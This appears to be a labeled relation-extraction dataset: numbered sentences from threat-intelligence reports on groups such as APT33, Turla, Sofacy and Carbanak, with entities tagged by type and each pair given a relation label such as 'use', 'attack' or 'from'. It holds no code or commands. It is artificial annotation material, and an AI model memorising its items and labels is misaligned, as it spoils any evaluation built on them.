74	Although we have only directly observed [E11:attacker] APT33 [E12:attacker] use DROPSHOT to deliver the [E21:malware] TURNEDUP [E22:malware] backdoor, we have identified multiple DROPSHOT samples in the wild that drop SHAPESHIFT," the report reads.	2	use
75	[E11:attacker] Turla [E12:attacker] is a sophisticated Russian cyber-espionage group, believed to be sponsored by the Russian government, that has targeted a number of government, military, embassy, [E21:industry] research [E22:industry], and pharmaceutical organisations in more than 45 countries, including China, Vietnam, and the United States.	1	attack
76	This is the first time we have observed an IoT botnet being used in a [E21:technique] DDoS [E22:technique] since Mirai, and it may be the first time [E11:malware] IoTroop [E12:malware] has been used to target victims since it was initially identified last year.	2	use
77	More recently, in May 2017, [E11:attacker] APT33 [E12:attacker] appeared to target a [E21:location] Saudi [E22:location] organization and a South Korean business conglomerate using a malicious file that attempted to entice victims with job vacancies for a Saudi Arabian petrochemical company.	1	attack
78	[E11:attacker] Turla [E12:attacker] is a prolific [E21:location] Russian [E22:location]-speaking group known for its covert exfiltration tactics such as the use of hijacked satellite connections, waterholing of government websites, covert channel backdoors, rootkits, and deception tactics.	3	from
79	Several of the corresponding sinkholed domains have been used over the years for multiple purposes by the [E11:attacker] Sofacy [E12:attacker] group, as C2s for multiple tools such as Azzy or [E21:tool] XAgent [E22:tool], or to host phishing sites to gather credentials from targets.	2	use
80	Over the course of the attack campaign, we have observed two different variations of the [E11:malware] Helminth [E12:malware] backdoor, one written in VBScript and [E21:tool] PowerShell [E22:tool] that was delivered via a macro within Excel spreadsheets and the other a standalone Windows executable.	2	use
81	APT28, also known as [E11:attacker] Sofacy [E12:attacker], is a [E21:location] Russian [E22:location] cyber-criminal group known to target high-profile government, military and security organizations using sophisticated tools and capabilities.	3	from
82	The [E11:malware] ShadowPad [E12:malware] framework contained a remotely activated [E21:technique] backdoor [E22:technique] which could be triggered by the threat actor through a specific value in a DNS TXT record.	2	use
83	Who are the victims? / What can you say about the targets of the attacks? The main targets of [E11:attacker] Careto [E12:attacker] fall into the following categories: Government institutions Diplomatic offices and [E21:industry] embassies [E22:industry] Energy, oil and gas companies Research institutions Private equity firms Activists Do we know the total number of victims? Although the exact number of victims is unknown, we observed victims at more than 1000 IP addresses in 31 countries.	1	attack
84	The whole OlympicDestroyer story eventually resulted in the discovery of a new subset of activity related to both [E11:attacker] Sofacy [E12:attacker] and [E21:malware] BlackEnergy [E22:malware] that we call Hades.	2	use
85	Thus, Silence joins the ranks of the most devastating and complex cyber-robbery operations like [E11:attacker] Metel [E12:attacker], GCMAN and Carbanak/Cobalt, which have succeeded in stealing millions of dollars from [E21:industry] financial [E22:industry] organizations.	1	attack
86	0120 [E11:attacker] Sofacy [E12:attacker] (also known as “Fancy Bear”, “Sednit”, “STRONTIUM” and “APT28”) is an advanced threat group that has been active since around 2008, targeting mostly [E21:industry] military [E22:industry] and government entities worldwide, with a focus on NATO countries.	1	attack
87	KopiLuwak: a new JavaScript payload from [E11:attacker] Turla [E12:attacker] The [E21:location] Russian [E22:location]-speaking APT group Turla (known variously as ‘Snake’, ‘Uroburos’, ‘Venomous Bear’ and ‘KRYPTON’) has been active since at least 2007 (and maybe even longer).	3	from
88	We also discovered Komplex command and control (C2) domains that overlapped with previously identified [E21:technique] phishing [E22:technique] campaign infrastructures associated with the [E11:attacker] Sofacy [E12:attacker] group,” researchers said. “We believe (it) may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.” “The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system – a move that showcases their continued evolution toward multi-platform attacks,” they added.	2	use
89	According to researchers, the [E11:attacker] APT15 [E12:attacker] group was able to deploy three backdoors – identified as [E21:malware] RoyalCli [E22:malware], RoyalDNS and BS2005 – on an unnamed UK contractor’s systems.	2	use
90	[E11:attacker] APT29 [E12:attacker] then created a [E21:technique] WMI [E22:technique] event subscription in order to execute the backdoor.	2	use
91	Earlier CARBANAK Activity In December 2014, Group-IB and Fox-IT released a report about an organized criminal group using malware called "[E11:malware] Anunak [E12:malware]" that has targeted Eastern European [E21:industry] banks [E22:industry], U.S. and European point-of-sale systems and other entities.	1	attack
92	A Trojan dubbed “[E11:malware] Komplex [E12:malware]” is delivered on OSX systems by exploiting a vulnerability in the [E21:tool] MacKeeper [E22:tool] antivirus application.	2	use
93	[E11:attacker] APT15 [E12:attacker] has surfaced over the past years, and has been tied to attacks including the TidePool malware attack used in an ongoing campaign against Indian embassy personnel globally in 2016, and the [E21:malware] BS2005 [E22:malware] attack targeting European diplomats and ministries of foreign affairs discovered in 2013. “Knowledge sharing in the security industry is vital in order to improve the security posture and capabilities of the sector and UK as a whole.	2	use
94	The hackers delivered the [E11:malware] GAMEFISH [E12:malware] backdoor (aka Sednit, Seduploader, [E21:malware] JHUHUGIT [E22:malware], and Sofacy), a malware that was used only by the APT28 group in past attacks.	4	same
95	We’ve seen quite a few versions of these implants and they were relatively widespread for a time. #Sofacy group has been active since 2008, targeting mostly [E11:industry] military [E12:industry] and government entities in [E21:location] NATO [E22:location] countriesTweet Earlier this year, we noticed a new release of the AZZY implant which, at the time, was largely undetected by anti-malware products.	3	from
96	In this case, Sofacy’s [E11:malware] SPLM [E12:malware] (aka [E21:malware] Xagent [E22:malware], aka CHOPSTICK) tool was found on the server, but it’s unclear what tactics were used by the APT to plant the malware.	5	similar
97	It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools: Komplex: /Users/kazak/Desktop/Project/komplex XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX We believe it is possible that [E11:attacker] Sofacy [E12:attacker] uses [E21:malware] Komplex [E22:malware] to download and install the XAgentOSX tool to use its expanded command set on the compromised system.	2	use
98	In July 2017, a FireEye Web MPS appliance detected and blocked a request to retrieve and install an [E11:attacker] APT34 [E12:attacker] [E21:malware] POWRUNER [E22:malware] / BONDUPDATER downloader file.	2	use
99	ELMER beacon APT16 While attribution of the first two spear phishing attacks is still uncertain, we attribute the second December phishing campaign to the [E21:location] China [E22:location]-based APT group that we refer to as [E11:attacker] APT16 [E12:attacker].	3	from
100	For example, the [E21:industry] financial [E22:industry] cybercrime group [E11:attacker] Carbanak [E12:attacker] and its followers, the so-called SWIFT hackers, have been able to steal millions of dollars from its roster of victims, which has included banks and other financial institutions.	1	attack
101	[E11:malware] GreyEnergy [E12:malware]’s malware framework bears many similarities to [E21:malware] BlackEnergy [E22:malware], as outlined below.	5	similar
102	FIN7 In all Mandiant investigations to date where the [E11:malware] CARBANAK [E12:malware] [E21:technique] backdoor [E22:technique] has been discovered, the activity has been attributed to the FIN7 threat group.	2	use
103	[E11:malware] Xtunnel [E12:malware] is a network proxy tool that can relay any kind of network trace between a [E21:technique] C&C [E22:technique] server on the Internet and an endpoint computer inside a local network.	2	use
104	Furthermore, iSIGHT's own sources indicate that BlackEnergy 3 malware was deployed on at least one of the [E21:location] Ukrainian [E22:location] power systems affected by [E11:malware] KillDisk [E12:malware]. iSIGHT Partners is still collecting information on the mechanics of the power outage and what role the KillDisk malware played in the greater event.	1	attack
105	And it’s turning up in some unexpected places: In December, [E11:malware] Coinhive [E12:malware] code was found embedded in all Web pages served by a WiFi hotspot at a [E21:industry] Starbucks [E22:industry] in Buenos Aires.	1	attack
106	The [E21:malware] Epic [E22:malware] [E11:attacker] Turla [E12:attacker] campaigns combined commodity exploits with zero-day attacks against Windows XP and Windows Server 2003 machines, as well as an Adobe Reader zero day have been used to elevate an attacker’s privileges on the underlying system.	2	use
107	The [E11:attacker] Sednit [E12:attacker] group — also known as [E21:attacker] Strontium [E22:attacker], APT28, Fancy Bear or Sofacy — is a group of attackers operating since 2004, if not earlier, and whose main objective is to steal confidential information from specific targets.	4	same
108	0149 Technical Appendix with IOCs Executive Summary Over the last 10 months, Kaspersky Lab researchers have analyzed a massive cyber-espionage operation which we call “[E21:malware] Epic [E22:malware] [E11:attacker] Turla [E12:attacker]”.	2	use
109	Use of the non-public [E21:tool] PowerShell [E22:tool] backdoor previously described by Morphisec and MalwareBytes (which we refer to as [E11:malware] POWERSTATS [E12:malware]).	2	use
110	In addition, the US Government has warned that the Hidden Cobra group has been using a Trojan horse called [E11:malware] Volgmer [E12:malware] in attempts to secretly compromise systems at government, financial, automotive, and [E21:industry] media [E22:industry] industries.	1	attack
111	Like previous [E11:attacker] Dragonfly [E12:attacker] campaigns, the hackers are using malicious email (containing very specific content related to the [E21:industry] energy [E22:industry] sector) attachments, watering hole attacks, and Trojanized software as an initial attack vector to gain access to a victim's network.	1	attack
112	Most recently, ‘Manuscrypt’ has become the primary backdoor used by the [E11:attacker] BlueNoroff [E12:attacker] sub-group to target [E21:industry] financial [E22:industry] institutions.	1	attack
113	In one remarkable case, the [E11:malware] Carbanak [E12:malware] 2.0 gang used its access to a [E21:industry] financial [E22:industry] institution that stores information about shareholders to change the ownership details of a large company.	1	attack
114	[E11:attacker] APT10 [E12:attacker] actors then compressed proprietary data from Visma using WinRAR (deployed by the attackers) and exfiltrated to a Dropbox account using the cURL for Windows [E21:tool] command-line [E22:tool] tool.	2	use
115	DOWNDELPH, which gets its name from being written in the Delphi programming language, is used in hacks orchestrated by the [E11:attacker] Sednit [E12:attacker] group to deploy the previously mentioned [E21:malware] XAGENT [E22:malware] and SEDRECO onto infected computers.	2	use
116	Sofacy has been heavily interested in military and foreign affairs organizations here, resulting in multiple overlapped and competing targeting scenarios: Mosquito Turla and Zebrocy clusters – Zebrocy clusters targeting diplomatic and commercial organizations within Europe and Asia that match Mosquito targeting profiling SPLM overlap with traditional Turla – often Turla precedes SPLM deployments SPLM overlap with Zebrocy – Zebrocy often precedes SPLM deployments SPLM overlap with Danti Currently, [E11:attacker] Sofacy [E12:attacker] targets large air-defense related commercial organizations in China with SPLM, and moves [E21:malware] Zebrocy [E22:malware] focus across Armenia, Turkey, Kazahkstan, Tajikistan, Afghanistan, Mongolia, China, and Japan.	2	use
117	Coincidentally (or not), in mid March, the company patched the vulnerability exploited by [E11:malware] EternalBlue [E12:malware], [E21:vulnerability] MS17-010 [E22:vulnerability], weeks before a group called the Shadow Brokers made it public.	2	use
118	[E11:malware] Critroni [E12:malware] (aka [E21:malware] CTB-Locker [E22:malware]) is the name of a new ransomware that has been recently included in the Angler exploit kit.	4	same
119	Source: IntrusionTruth) The December [E11:attacker] APT10 [E12:attacker] indictment noted that the group’s malicious activities breached at least 45 companies and managed service providers in 12 countries, including Brazil, Canada, Finland, France, Germany, India, [E21:location] Japan [E22:location], Sweden, Switzerland, the United Arab Emirates, the United Kingdom, and the United States.	1	attack
120	Iranian OilRig APT is back The [E11:attacker] OilRig [E12:attacker] APT is one of the most popular hacker group linked to the [E21:location] Iranian [E22:location] Governments that has been around since at least 2015.	3	from
121	It appears the spyware is similar to that used in the [E11:malware] StrongPity [E12:malware] APT attacks that targeted Italian and [E21:location] Belgian [E22:location] users.	1	attack
122	Who are the victims? / What can you say about the targets of the attacks? The main targets of [E11:attacker] Careto [E12:attacker] fall into the following categories: [E21:industry] Government [E22:industry] institutions Diplomatic offices and embassies Energy, oil and gas companies Research institutions Private equity firms Activists Do we know the total number of victims? Although the exact number of victims is unknown, we observed victims at more than 1000 IP addresses in 31 countries.	1	attack
